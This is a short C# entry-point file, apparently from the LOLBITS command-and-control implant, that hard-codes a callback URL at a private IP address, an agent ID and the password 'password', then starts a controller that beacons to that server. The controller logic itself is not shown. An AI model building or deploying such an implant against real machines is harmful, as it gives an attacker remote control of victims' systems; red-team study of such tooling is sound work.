

namespace LOLBITS
{
    public class Program
    {

        private const string FirstId = "abcde1234";
        private const string Url = "http://192.168.1.69/final/";
        private const string Password = "password";
 

        static void Main(string[] args)
        {

            Controler c = new Controler(FirstId, Url, Password);
            c.Start();

        }

    }

}
